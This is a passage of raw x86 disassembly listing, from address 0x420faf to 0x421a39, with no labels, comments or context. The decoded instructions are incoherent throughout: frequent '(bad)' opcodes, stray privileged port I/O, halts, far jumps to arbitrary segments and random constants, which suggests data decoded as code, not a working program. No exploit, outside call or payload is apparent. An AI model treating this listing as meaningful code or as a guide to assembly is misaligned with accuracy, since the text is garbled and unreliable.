  420faf:	imul   edx,ecx,0xd
  420fb2:	adc    edi,DWORD PTR [ebx]
  420fb4:	add    bh,BYTE PTR [edi-0x37e4c0cb]
  420fba:	out    dx,al
  420fbb:	hlt    
  420fbc:	and    bl,BYTE PTR [edx-0x28]
  420fbf:	pop    esi
  420fc0:	dec    esp
  420fc1:	jle    0x420fa8
  420fc3:	push   cs
  420fc4:	in     al,dx
  420fc5:	mov    ds:0x33c3d020,al
  420fca:	mov    ecx,ss
  420fcc:	lea    ecx,[esi+0x665f218c]
  420fd2:	mov    eax,0xc4ec8674
  420fd7:	pusha  
  420fd8:	pusha  
  420fd9:	ins    DWORD PTR es:[edi],dx
  420fda:	mov    dl,0x15
  420fdc:	xor    eax,DWORD PTR [ebx+eax*4-0x3552a4c8]
  420fe3:	sti    
  420fe4:	dec    eax
  420fe5:	js     0x420fb1
  420fe7:	stc    
  420fe8:	lods   eax,DWORD PTR ds:[esi]
  420fe9:	and    al,0x8c
  420feb:	xchg   edx,eax
  420fec:	repnz pusha 
  420fee:	and    DWORD PTR [esi+edx*2-0x3d],esi
  420ff2:	ja     0x421060
  420ff4:	sbb    dh,cl
  420ff6:	scas   eax,DWORD PTR es:[edi]
  420ff7:	push   ss
  420ff8:	or     BYTE PTR [edx+0x65],ch
  420ffb:	jecxz  0x421031
  420ffd:	ret    0xc7b2
  421000:	pop    esp
  421001:	sub    eax,0xcd451ea4
  421006:	aaa    
  421007:	mov    edx,0x417a4cea
  42100c:	scas   eax,DWORD PTR es:[edi]
  42100d:	(bad)  
  42100e:	mov    esp,0x49cc107c
  421013:	mov    cl,dl
  421015:	inc    edi
  421016:	inc    ecx
  421017:	int    0x62
  421019:	inc    esi
  42101a:	retf   0xe570
  42101d:	mov    esi,0xfc789322
  421022:	xor    al,0x98
  421024:	mov    esp,0xc72a0e89
  421029:	inc    ecx
  42102a:	mov    al,ds:0x84ee68f5
  42102f:	jbe    0x421059
  421031:	fwait
  421032:	ror    ecx,cl
  421034:	es or  eax,0x8794778d
  42103a:	sub    DWORD PTR [edi],edi
  42103c:	jae    0x42102b
  42103e:	mov    eax,ds:0x33f307b
  421043:	aam    0xa8
  421045:	sub    DWORD PTR [ebx-0x7065069f],edx
  42104b:	adc    eax,0x5751533a
  421050:	pop    esp
  421051:	and    al,0xef
  421053:	call   0x10f5b245
  421058:	nop
  421059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42105a:	retf   0x288d
  42105d:	shr    DWORD PTR [eax],cl
  42105f:	push   0x10a3f952
  421064:	and    DWORD PTR [ecx-0x58d9929f],eax
  42106a:	(bad)  
  42106b:	push   esi
  42106c:	ret    0x511d
  42106f:	or     BYTE PTR [esi-0x1d],0xeb
  421073:	outs   dx,DWORD PTR ds:[esi]
  421074:	sbb    BYTE PTR [ecx],bl
  421076:	enter  0x4782,0xe
  42107a:	shr    DWORD PTR [esi+0x43376618],1
  421080:	psadbw mm5,QWORD PTR [ebx+edi*1-0xa75043e]
  421088:	xor    edx,edi
  42108a:	in     al,0x7f
  42108c:	mov    bl,0x66
  42108e:	dec    ecx
  42108f:	fild   DWORD PTR [eax]
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    fs,WORD PTR [edx+ecx*2+0x7e]
  421103:	repz or al,0x60
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	or     bh,dh
  42110e:	inc    edi
  42110f:	int3   
  421110:	shl    edx,0x95
  421113:	xor    BYTE PTR [ebx],dh
  421115:	xlat   BYTE PTR ds:[ebx]
  421116:	stos   DWORD PTR es:[edi],eax
  421117:	xchg   DWORD PTR [edi-0x19],ecx
  42111a:	jl     0x42111f
  42111c:	(bad)  
  42111d:	jbe    0x421194
  42111f:	dec    edi
  421120:	mov    edi,0xd6bf8f65
  421125:	scas   eax,DWORD PTR es:[edi]
  421126:	das    
  421127:	sbb    cl,al
  421129:	dec    eax
  42112a:	(bad)  
  42112b:	shl    BYTE PTR ds:0x7e268141,cl
  421131:	push   ss
  421132:	mov    eax,ds:0xbca7041d
  421137:	add    al,0xb1
  421139:	pand   mm3,QWORD PTR [esi]
  42113c:	cmp    dh,BYTE PTR [esi]
  42113e:	inc    ebp
  42113f:	imul   ecx,DWORD PTR [eax],0xb1376ebd
  421145:	aaa    
  421146:	loope  0x421182
  421148:	icebp  
  421149:	add    eax,0x88f2ac23
  42114e:	ja     0x42113b
  421150:	mov    ds:0xfa69677b,al
  421155:	mov    bl,0x85
  421157:	out    dx,eax
  421158:	push   0xfffffffd
  42115a:	loope  0x4210ec
  42115c:	dec    ebp
  42115d:	inc    esp
  42115e:	pop    esp
  42115f:	mov    dl,0x1c
  421161:	sub    cl,BYTE PTR [eax+0x14e27efc]
  421167:	add    bh,ch
  421169:	jns    0x42115f
  42116b:	xchg   edx,eax
  42116c:	adc    DWORD PTR [ebp+0x439d146b],ebp
  421172:	xlat   BYTE PTR ds:[ebx]
  421173:	dec    ebx
  421174:	mov    al,0xbf
  421176:	icebp  
  421177:	push   esi
  421178:	enter  0x5820,0x8e
  42117c:	pop    ds
  42117d:	jno    0x421149
  42117f:	push   0x34
  421181:	mov    edx,0xf448811b
  421186:	mov    ecx,DWORD PTR [edi-0x22076c20]
  42118c:	mov    esi,0xc8e4e806
  421191:	or     eax,0xffffd647
  421196:	pop    ecx
  421197:	mov    cl,0x42
  421199:	add    DWORD PTR [edx-0x3e8b834f],0xa591275b
  4211a3:	jno    0x4211d9
  4211a5:	push   0x30
  4211a7:	test   eax,0xed431f33
  4211ac:	xor    edx,esp
  4211ae:	xchg   dh,cl
  4211b0:	bound  edi,QWORD PTR [ecx+0x7398a192]
  4211b6:	mov    ah,0x13
  4211b8:	cmp    eax,0x111c782a
  4211bd:	xchg   edi,eax
  4211be:	xor    al,0x58
  4211c0:	gs pop eax
  4211c2:	mov    esi,DWORD PTR [ecx+eax*8+0x3e1411b7]
  4211c9:	repnz dec edx
  4211cb:	adc    BYTE PTR [ecx+0x53],dh
  4211ce:	cmc    
  4211cf:	lock in al,0x63
  4211d2:	pop    ebp
  4211d3:	xchg   BYTE PTR ds:0xd6770c4b,bh
  4211d9:	inc    ebp
  4211da:	sub    DWORD PTR [eax],eax
  4211dc:	test   DWORD PTR [ebx-0x4e],ebx
  4211df:	push   ss
  4211e0:	loopne 0x42122d
  4211e2:	sbb    DWORD PTR [eax+0x5d],ebx
  4211e5:	push   edx
  4211e6:	xlat   BYTE PTR ds:[ebx]
  4211e7:	inc    esp
  4211e8:	jg     0x42123d
  4211ea:	out    0xdd,eax
  4211ec:	in     eax,dx
  4211ed:	adc    DWORD PTR [ebx+eiz*2+0x6a9b788b],ebx
  4211f4:	ret    
  4211f5:	sbb    BYTE PTR [edx-0x30],dl
  4211f8:	fistp  QWORD PTR [eax+0x5a]
  4211fb:	je     0x4211f0
  4211fd:	ret    0x2bab
  421200:	push   0xe434d59e
  421205:	aam    0x3f
  421207:	push   es
  421208:	adc    al,0x10
  42120a:	xor    ebp,DWORD PTR [ecx+0x40fcbc48]
	...
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0xdd7ab32d
  421281:	mov    DWORD PTR [eax-0x6e],esi
  421284:	adc    BYTE PTR [ecx+0x1],ah
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	(bad)  
  42128d:	popa   
  42128e:	outs   dx,BYTE PTR es:[esi]
  421290:	cmp    esp,ecx
  421292:	shr    BYTE PTR [edx+0x38],1
  421295:	mov    ah,0x42
  421297:	shl    BYTE PTR [ecx+edi*8],1
  42129a:	repnz cld 
  42129c:	jne    0x421279
  42129e:	sar    BYTE PTR [ebp+0x6e],0x77
  4212a2:	outs   dx,BYTE PTR ds:[esi]
  4212a3:	fdivr  QWORD PTR [esi-0x38f5f06f]
  4212a9:	popf   
  4212aa:	js     0x421269
  4212ac:	in     al,0x74
  4212ae:	xor    BYTE PTR [ecx+ecx*2-0xf],0x9e
  4212b3:	sbb    BYTE PTR [ebp+0x116cb170],dh
  4212b9:	adc    BYTE PTR [esi+eax*1],al
  4212bc:	cmp    DWORD PTR [esp+edx*8-0x36],ebx
  4212c0:	sub    al,0x78
  4212c2:	pop    ecx
  4212c3:	pop    ss
  4212c4:	repnz mov ds:0x4904cbbd,eax
  4212ca:	les    esi,FWORD PTR [ebx+0x3c70b052]
  4212d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212d1:	nop
  4212d2:	popf   
  4212d3:	shl    BYTE PTR [edx+0x61],cl
  4212d6:	or     BYTE PTR [edx+ebx*2-0x144f6449],dl
  4212dd:	dec    ebx
  4212de:	push   cs
  4212df:	adc    DWORD PTR [ebx],edx
  4212e1:	push   ebp
  4212e2:	pop    es
  4212e3:	inc    ebp
  4212e4:	jbe    0x421296
  4212e6:	mov    cl,BYTE PTR [edx+0x12f2bf5a]
  4212ec:	jae    0x421355
  4212ee:	xchg   esp,eax
  4212ef:	mov    ds:0xc96377eb,al
  4212f4:	lods   al,BYTE PTR ds:[esi]
  4212f5:	jg     0x4212c3
  4212f7:	adc    al,0x43
  4212f9:	xlat   BYTE PTR ds:[ebx]
  4212fa:	mov    esi,eax
  4212fc:	add    bl,cl
  4212fe:	dec    esi
  4212ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421300:	fstp   QWORD PTR [esi]
  421302:	mov    bl,0xe6
  421304:	jno    0x421351
  421306:	popa   
  421307:	pop    ebx
  421308:	adc    bl,BYTE PTR [edi-0x6012251d]
  42130e:	dec    eax
  42130f:	xchg   ecx,eax
  421310:	test   al,0x42
  421312:	push   es
  421313:	sub    al,BYTE PTR [ebx]
  421315:	js     0x4212a2
  421317:	inc    ebp
  421318:	xchg   ecx,eax
  421319:	ja     0x42135c
  42131b:	aad    0x96
  42131d:	push   0x3b63ba26
  421322:	das    
  421323:	sbb    ebx,DWORD PTR [ebp-0x2a4a3dac]
  421329:	fwait
  42132a:	popf   
  42132b:	cli    
  42132c:	leave  
  42132d:	mov    cl,0x1a
  42132f:	mov    ds:0x3a7ff5c2,al
  421334:	(bad)  
  421335:	ss call 0x59c0f464
  42133b:	out    0x93,al
  42133d:	jl     0x42130c
  42133f:	out    dx,al
  421340:	rcr    BYTE PTR [eax+0x4e214197],1
  421346:	mov    edi,DWORD PTR [ebp-0x199a251c]
  42134c:	add    al,0x2e
  42134e:	aam    0x54
  421350:	ja     0x421303
  421352:	pop    es
  421353:	jbe    0x42132d
  421355:	aam    0x63
  421357:	jae    0x421345
  421359:	mov    al,ch
  42135b:	mov    edi,0xfcf30e79
  421360:	mov    cl,0x77
  421362:	cmp    BYTE PTR [ecx-0x53],bh
  421365:	hlt    
  421366:	cmc    
  421367:	adc    ah,BYTE PTR [eax-0x6aaff333]
  42136d:	icebp  
  42136e:	test   al,0x94
  421370:	outs   dx,DWORD PTR ds:[esi]
  421371:	retf   0x9994
  421374:	sbb    bh,dl
  421376:	test   al,0xf
  421378:	inc    ecx
  421379:	ins    BYTE PTR es:[edi],dx
  42137a:	popf   
  42137b:	inc    esi
  42137c:	aaa    
  42137d:	jne    0x42138d
  42137f:	retf   0xa55e
  421382:	push   ecx
  421383:	outs   dx,BYTE PTR ds:[esi]
  421384:	push   0x7f4a22dd
  421389:	pop    DWORD PTR [ebx+ebx*1]
  42138c:	arpl   WORD PTR [edi-0x7d],sp
  42138f:	jl     0x421391
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x7c5ff49f]
  421402:	fs mov al,0x14
  421405:	bound  eax,QWORD PTR [ecx]
  421407:	add    BYTE PTR [ecx+eax*1],al
  42140a:	add    BYTE PTR [eax],al
  42140c:	xchg   esi,eax
  42140d:	(bad)  
  42140e:	dec    eax
  42140f:	push   ss
  421410:	and    eax,0x323bb2b7
  421415:	inc    edi
  421416:	add    eax,0x58bd553
  42141b:	sub    dh,BYTE PTR [ebp-0x77]
  42141e:	mov    ch,0xe9
  421420:	adc    al,0xc7
  421422:	fs mov edx,0xfc3945f4
  421428:	mov    eax,ds:0x468244fa
  42142d:	hlt    
  42142e:	lahf   
  42142f:	and    eax,0x4d85c6dc
  421434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421436:	xchg   ebp,eax
  421437:	repnz xchg ecx,eax
  421439:	add    al,0x30
  42143b:	pop    edx
  42143c:	dec    ebp
  42143d:	fisttp QWORD PTR [eax]
  42143f:	(bad)  
  421440:	sub    BYTE PTR [eax-0x5af2bea1],bh
  421446:	js     0x421428
  421448:	xor    eax,0x20672944
  42144d:	cmc    
  42144e:	retf   0x5bdc
  421451:	xor    DWORD PTR [eax],0x4a
  421454:	sub    eax,0xca4d5a6f
  421459:	ret    0x1df8
  42145c:	fst    DWORD PTR [ecx+ebx*4-0x24c54cd7]
  421463:	ja     0x421455
  421465:	jmp    0x1e277b54
  42146a:	int    0x66
  42146c:	mov    ebp,0x53312ae8
  421471:	push   edx
  421472:	inc    esi
  421473:	shl    bh,1
  421475:	ret    
  421476:	int    0x65
  421478:	fadd   QWORD PTR [edi+0x3e]
  42147b:	js     0x421441
  42147d:	scas   al,BYTE PTR es:[edi]
  42147e:	je     0x4214ad
  421480:	ss pop ss
  421482:	sub    eax,0x5e84b9e6
  421487:	rcl    DWORD PTR [edi-0x5e],1
  42148a:	jns    0x4214ac
  42148c:	mov    al,ds:0xe061198d
  421491:	mov    ebp,0xaf6d7031
  421496:	and    bh,cl
  421498:	ror    DWORD PTR [edx],0x81
  42149b:	lahf   
  42149c:	adc    dl,dl
  42149e:	(bad)  
  4214a0:	mov    ds:0x3d6969cc,eax
  4214a5:	dec    ebx
  4214a6:	mov    bh,0x98
  4214a8:	mov    dh,0x40
  4214aa:	int3   
  4214ab:	in     eax,dx
  4214ac:	inc    ebx
  4214ad:	mov    ecx,0x73af2d27
  4214b2:	mov    eax,DWORD PTR [eax-0x7680da5d]
  4214b8:	ret    
  4214b9:	test   DWORD PTR [esp+edi*2+0x24a88a5f],ebp
  4214c0:	inc    ebx
  4214c1:	pop    ss
  4214c2:	fs dec esp
  4214c4:	jb     0x421526
  4214c6:	sahf   
  4214c7:	icebp  
  4214c8:	lods   al,BYTE PTR ds:[esi]
  4214c9:	pushf  
  4214ca:	ss into 
  4214cc:	push   edi
  4214cd:	jne    0x42145e
  4214cf:	int3   
  4214d0:	add    al,0x61
  4214d2:	inc    edx
  4214d3:	dec    edx
  4214d4:	call   0x6824:0xd5e0edbb
  4214db:	sbb    esp,DWORD PTR [ebx]
  4214dd:	aas    
  4214de:	test   eax,0xd6b2f38c
  4214e3:	das    
  4214e4:	dec    ecx
  4214e5:	pop    edx
  4214e6:	jae    0x421516
  4214e8:	sar    BYTE PTR [ebx+0x44e1297b],0xae
  4214ef:	pop    ss
  4214f0:	sti    
  4214f1:	out    dx,eax
  4214f2:	scas   al,BYTE PTR es:[edi]
  4214f3:	imul   ebx,ebx,0x9aa406e4
  4214f9:	cwde   
  4214fa:	mov    ah,0xcf
  4214fc:	cwde   
  4214fd:	mov    esi,0x929e4a9
  421502:	arpl   WORD PTR [edi+0x6a],dx
  421505:	(bad)  
  421506:	cmp    edx,DWORD PTR [edi+0x49d4120d]
  42150c:	xchg   edx,eax
  42150d:	int    0x6d
  42150f:	pop    ss
	...
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x506bd4c],bp
  421582:	pop    ss
  421583:	ret    0x6318
  421586:	add    DWORD PTR [eax],eax
  421588:	add    al,0x1
  42158a:	add    BYTE PTR [eax],al
  42158c:	mov    ecx,0xa544a191
  421591:	in     eax,dx
  421592:	jge    0x42153e
  421594:	repnz mov ds:0xbf5155ba,eax
  42159a:	mov    bl,0xb8
  42159c:	shl    BYTE PTR [ecx+0x119e33ee],0xb2
  4215a3:	mov    edx,0xdae28dd4
  4215a8:	mov    esi,0xdd69e27d
  4215ad:	mov    ds:0xefdca5f5,al
  4215b2:	data16 repz jae 0x4215b3
  4215b6:	push   ds
  4215b7:	mov    ch,0x16
  4215b9:	push   ebx
  4215ba:	in     al,dx
  4215bb:	mov    ecx,0x7378c60d
  4215c0:	lds    ebx,FWORD PTR [eax-0x3]
  4215c3:	aas    
  4215c4:	adc    edx,esi
  4215c6:	mov    ecx,0x161a4bb6
  4215cb:	popf   
  4215cc:	dec    ebp
  4215cd:	xchg   DWORD PTR [ebp-0x2f5f2a47],eax
  4215d3:	cmp    ebx,DWORD PTR [edi+0x51]
  4215d6:	push   edi
  4215d7:	test   BYTE PTR [ecx+eiz*8-0x2d3ebb8a],al
  4215de:	cmp    edi,DWORD PTR [esi-0x36]
  4215e1:	dec    edi
  4215e2:	mov    ch,0x4b
  4215e4:	inc    ebx
  4215e5:	mov    ah,0xa5
  4215e7:	push   cs
  4215e8:	mov    BYTE PTR [ebx],al
  4215ea:	test   al,0x4a
  4215ec:	jo     0x421627
  4215ee:	retf   
  4215ef:	add    dh,BYTE PTR [edx-0x249c862b]
  4215f5:	push   ds
  4215f6:	pop    ebp
  4215f7:	dec    ebp
  4215f8:	out    0x1a,eax
  4215fa:	mov    edi,0x969031e4
  4215ff:	imul   esi,esp,0x15551a61
  421605:	clc    
  421606:	stc    
  421607:	fst    QWORD PTR [edx+eiz*4]
  42160a:	jmp    0x421594
  42160c:	call   0x7b9ba813
  421611:	jmp    0x421674
  421613:	push   eax
  421614:	addr16 pop edi
  421616:	mov    DWORD PTR [ebx+0x5c],esi
  421619:	pop    es
  42161a:	sub    dl,BYTE PTR [edi+edi*8-0x78]
  42161e:	out    dx,al
  42161f:	ret    
  421620:	fwait
  421621:	sub    dh,bl
  421623:	std    
  421624:	sahf   
  421625:	or     eax,0xe6171cda
  42162a:	stos   DWORD PTR es:[edi],eax
  42162b:	xor    ah,BYTE PTR [edi+0x17]
  42162e:	jno    0x421655
  421630:	in     al,0x73
  421632:	icebp  
  421633:	inc    esp
  421634:	mov    bl,0x98
  421636:	xchg   edx,eax
  421637:	xor    BYTE PTR [edi+0x67],ch
  42163a:	cmp    al,0x4d
  42163c:	adc    esp,DWORD PTR [ecx+0x47]
  42163f:	jns    0x421666
  421641:	push   ecx
  421642:	loope  0x421600
  421644:	cli    
  421645:	xor    al,0x49
  421647:	shr    BYTE PTR [ebx-0x2febf583],1
  42164d:	lea    eax,[esi-0x30]
  421650:	add    al,0x97
  421652:	test   DWORD PTR [ecx+0x13],edx
  421655:	out    0xe8,eax
  421657:	cmp    edx,esi
  421659:	ins    DWORD PTR es:[edi],dx
  42165a:	cmp    DWORD PTR [esi+0x5ddbf899],esi
  421660:	clc    
  421661:	jecxz  0x4216e1
  421663:	fmul   QWORD PTR [edx+0x7c]
  421666:	test   eax,0xd6f228a4
  42166b:	xchg   esi,eax
  42166c:	adc    BYTE PTR [ecx+0x67],al
  42166f:	jge    0x4216d1
  421671:	icebp  
  421672:	(bad)  
  421673:	sub    al,0xda
  421675:	sub    al,0x46
  421677:	xchg   DWORD PTR [eax-0x2c],ebx
  42167a:	jmp    0x719f:0xd66038d
  421681:	sbb    BYTE PTR [eax],ch
  421683:	imul   ebx,esi,0xce483fcf
  421689:	ins    BYTE PTR es:[edi],dx
  42168a:	jp     0x42161d
  42168c:	aaa    
  42168d:	pusha  
  42168e:	adc    al,0xb7
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	cli    
  421701:	push   ecx
  421702:	lds    edx,FWORD PTR [ebp+0x1c]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	ins    BYTE PTR es:[edi],dx
  42170d:	mov    BYTE PTR [edi+0x61],dl
  421710:	std    
  421711:	mov    eax,0xc8adf37b
  421716:	add    dl,0x13
  421719:	fisttp QWORD PTR [ebx]
  42171b:	jno    0x42173a
  42171d:	adc    eax,0xab51ecf9
  421722:	cmp    DWORD PTR [esi-0x80],edi
  421725:	xchg   ebx,eax
  421726:	bound  ebx,QWORD PTR ds:0x35b8c1a8
  42172c:	retf   
  42172d:	ja     0x4216e2
  42172f:	mov    WORD PTR [ebp+0x65],gs
  421732:	das    
  421733:	or     ebx,DWORD PTR [ebx]
  421735:	(bad)  
  421736:	call   0xd999938e
  42173b:	leave  
  42173c:	stos   BYTE PTR es:[edi],al
  42173d:	loope  0x4216dc
  42173f:	int3   
  421740:	dec    ebp
  421741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421742:	out    dx,al
  421743:	ins    DWORD PTR es:[edi],dx
  421744:	das    
  421745:	out    0xe3,al
  421747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421748:	dec    esp
  421749:	retw   
  42174b:	mov    ecx,0x3b8420fe
  421750:	(bad)  
  421751:	xor    dh,dh
  421753:	cli    
  421754:	dec    eax
  421755:	in     eax,dx
  421756:	dec    eax
  421757:	(bad)  
  421758:	in     eax,0x9f
  42175a:	repnz aaa 
  42175c:	fsub   DWORD PTR [ebx+0x7408a58c]
  421762:	enter  0xcb4f,0xda
  421766:	sbb    al,0x36
  421768:	dec    eax
  421769:	sub    cl,BYTE PTR [eax]
  42176b:	loop   0x4216fb
  42176d:	jae    0x4217a7
  42176f:	and    bp,ax
  421772:	in     eax,dx
  421773:	and    ebp,edi
  421775:	push   esi
  421776:	sbb    BYTE PTR [ebp+ebp*1-0x54],al
  42177a:	fld    QWORD PTR [ebx+0x6b]
  42177d:	ins    BYTE PTR es:[edi],dx
  42177e:	mov    cl,0xa
  421780:	fst    DWORD PTR [edx]
  421782:	push   edi
  421783:	mov    bl,0x32
  421785:	xor    ebx,edi
  421787:	and    BYTE PTR [esi],bh
  421789:	shl    DWORD PTR [ecx+0x73],1
  42178c:	test   DWORD PTR [edx+0x312bf180],0xec75e126
  421796:	inc    edx
  421797:	jg     0x421810
  421799:	mov    bl,0x55
  42179b:	adc    DWORD PTR [ecx],esi
  42179d:	lds    edx,FWORD PTR [edx]
  42179f:	fst    st(6)
  4217a1:	sbb    bh,bl
  4217a3:	adc    cl,BYTE PTR [ebx+eiz*1]
  4217a6:	rcl    esi,0xe3
  4217a9:	lods   eax,DWORD PTR ds:[esi]
  4217aa:	addr16 xchg ebx,eax
  4217ac:	pop    ds
  4217ad:	stos   DWORD PTR es:[edi],eax
  4217ae:	cmp    DWORD PTR [ecx],0x2a
  4217b1:	jge    0x421781
  4217b3:	push   esi
  4217b4:	mov    ecx,ebp
  4217b6:	sub    edx,ebp
  4217b8:	arpl   WORD PTR [ebp+0x56],di
  4217bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217bc:	clc    
  4217bd:	xor    eax,0x976e020
  4217c2:	not    edx
  4217c4:	out    dx,al
  4217c5:	imul   edi,DWORD PTR [edi+0x38dc746a],0xffffff9d
  4217cc:	or     eax,0xe263b32a
  4217d1:	xor    DWORD PTR [edx-0x7c],ebp
  4217d4:	cmp    eax,0xde71c93a
  4217d9:	jecxz  0x42185a
  4217db:	icebp  
  4217dc:	mov    ah,0x4c
  4217de:	ret    
  4217df:	pop    edi
  4217e0:	les    eax,FWORD PTR [edx-0x603def5e]
  4217e6:	adc    eax,0x7fb788e4
  4217eb:	or     ch,BYTE PTR [ebx]
  4217ed:	sbb    eax,0xcebb9b07
  4217f2:	loope  0x421776
  4217f4:	lds    esi,FWORD PTR [ebx+eiz*8-0x7c]
  4217f8:	cmp    BYTE PTR [ecx-0x3e],ah
  4217fb:	sub    esi,DWORD PTR [esi]
  4217fd:	and    cl,BYTE PTR [edx-0x58a05833]
  421803:	sbb    eax,0x900921ef
  421808:	jo     0x4217a9
  42180a:	push   ds
  42180b:	jae    0x421871
  42180d:	in     al,0x46
  42180f:	lahf   
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	(bad)  
  421882:	test   DWORD PTR [eax+eiz*1+0x4000165],esp
  421889:	add    DWORD PTR [eax],eax
  42188b:	add    BYTE PTR [edi-0x15],bl
  42188e:	xor    esi,0x838efcb
  421894:	les    ebx,FWORD PTR [ecx+0x66]
  421897:	adc    eax,0x751daf7e
  42189c:	jo     0x42191a
  42189e:	adc    BYTE PTR [ebx-0x9],cl
  4218a1:	mov    ebx,0xccf9defb
  4218a6:	js     0x421925
  4218a8:	aaa    
  4218a9:	mov    bh,0x15
  4218ab:	push   DWORD PTR [eax-0x1a]
  4218ae:	loope  0x4218a7
  4218b0:	cwde   
  4218b1:	xchg   edx,eax
  4218b2:	and    edx,DWORD PTR [edi]
  4218b4:	jg     0x421838
  4218b6:	inc    esp
  4218b7:	sbb    al,0x34
  4218b9:	push   cs
  4218ba:	das    
  4218bb:	mov    ebx,0xa4e207fc
  4218c0:	icebp  
  4218c1:	imul   eax,DWORD PTR [ecx+0xe],0x20199391
  4218c8:	and    BYTE PTR [edi+ebx*1+0x2218001],ah
  4218cf:	mov    edi,DWORD PTR [edi+0x7005a0f3]
  4218d5:	imul   edx,DWORD PTR [eax+ecx*4-0x66],0x6d
  4218da:	cdq    
  4218db:	jb     0x4218d9
  4218dd:	push   cs
  4218de:	rcl    BYTE PTR [esi],cl
  4218e0:	pop    ecx
  4218e1:	aad    0x37
  4218e3:	ins    BYTE PTR es:[edi],dx
  4218e4:	mov    edi,0xedf63398
  4218e9:	xchg   esi,eax
  4218ea:	fimul  DWORD PTR [edx-0x3a]
  4218ed:	xlat   BYTE PTR ds:[ebx]
  4218ee:	cmp    al,0x50
  4218f0:	cmp    DWORD PTR [edi+0x79621683],ecx
  4218f6:	xchg   edx,eax
  4218f7:	or     eax,0x6e85b168
  4218fc:	jmp    0x715e:0x4eda98fb
  421903:	hlt    
  421904:	(bad)  
  421905:	sub    ch,ch
  421907:	add    BYTE PTR [eax-0x31326990],dl
  42190d:	jno    0x4218c1
  42190f:	jnp    0x42196b
  421911:	(bad)  
  421912:	out    0x7d,al
  421914:	sbb    BYTE PTR [edx+0x10],0xfe
  421918:	cld    
  421919:	cwde   
  42191a:	or     BYTE PTR [eax+0x5e],dl
  42191d:	enter  0x156a,0x10
  421921:	xchg   ebp,eax
  421922:	xchg   esp,eax
  421923:	mov    edi,0x830d74f6
  421928:	inc    esp
  421929:	mov    WORD PTR [edi-0x56],?
  42192c:	xor    BYTE PTR [eax+0x2e],bh
  42192f:	(bad)  
  421930:	fisubr WORD PTR [esi+edx*2-0x48ddc855]
  421937:	aam    0x7f
  421939:	xchg   ecx,eax
  42193a:	rcr    DWORD PTR [edx],1
  42193c:	out    dx,al
  42193d:	cwde   
  42193e:	inc    esp
  42193f:	jo     0x421910
  421941:	jne    0x421951
  421943:	add    al,0x1
  421945:	cmp    esi,DWORD PTR [esi+0x6]
  421948:	or     edx,DWORD PTR [edx-0x6895fa1e]
  42194e:	je     0x4218df
  421950:	or     BYTE PTR [edi+0x6f49d560],dh
  421956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421957:	sti    
  421958:	push   ebp
  421959:	scas   eax,DWORD PTR es:[edi]
  42195a:	inc    esp
  42195b:	jle    0x421921
  42195d:	in     eax,dx
  42195e:	cmp    eax,0x41122c33
  421963:	loopne 0x4219d6
  421965:	loopne 0x4219ae
  421967:	inc    ecx
  421968:	out    0x10,eax
  42196a:	lock sahf 
  42196c:	mov    ds:0xf43f50ad,al
  421971:	mov    bl,0x39
  421973:	ins    DWORD PTR es:[edi],dx
  421974:	in     eax,0x87
  421976:	das    
  421977:	mov    DWORD PTR [ecx-0x55cc3d09],ebx
  42197d:	sbb    eax,0x9667c455
  421982:	test   eax,0xdbddc700
  421987:	and    eax,0xeac34ab4
  42198c:	int3   
  42198d:	xchg   ebp,eax
  42198e:	je     0x421964
	...
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	stos   DWORD PTR es:[edi],eax
  421a01:	stos   BYTE PTR es:[edi],al
  421a02:	and    al,ch
  421a04:	and    al,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	mov    eax,0x3728c582
  421a11:	and    bl,BYTE PTR [eax+0x63]
  421a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a15:	jmp    0xfea2:0xe46f1a89
  421a1c:	dec    ebx
  421a1d:	jb     0x421a34
  421a1f:	scas   al,BYTE PTR es:[edi]
  421a20:	aaa    
  421a21:	mov    al,ds:0x293299f4
  421a26:	sar    BYTE PTR [esi-0x74d62e2e],cl
  421a2c:	in     eax,0xd
  421a2e:	jb     0x421a28
  421a30:	jmp    0x658e:0xedbadf68
  421a37:	add    ch,bh
  421a39:	mov    bh,0x9a
